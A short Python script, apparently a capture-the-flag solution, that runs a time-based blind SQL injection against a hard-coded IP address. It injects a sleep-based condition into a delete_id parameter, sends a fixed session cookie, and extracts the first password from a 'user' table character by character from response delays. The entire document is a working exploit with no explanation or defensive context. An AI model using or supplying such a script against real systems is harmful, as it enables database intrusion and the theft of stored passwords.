import requests
import time

flag = ''
maxlength = 29
host = 'http://139.199.182.61:19999/index.php?method=delete&delete_id=28'
cookie = {
"PHPSESSID":"fsgq6msbpn8ue3s622bvuhvrfj"
}
for i in range(1, maxlength):
    for x in range(32,127):
        payload = " and (if(ascii(substr((Select password from user limit 0,1),{0},1)) ={1},sleep(5),null))"
        url = (host + payload.format(i,x))
        print(url)
        start_time=time.time()
        r = requests.get(url, cookies=cookie)
        if time.time() - start_time > 4:
            flag += chr(x)
            print(flag)
            break

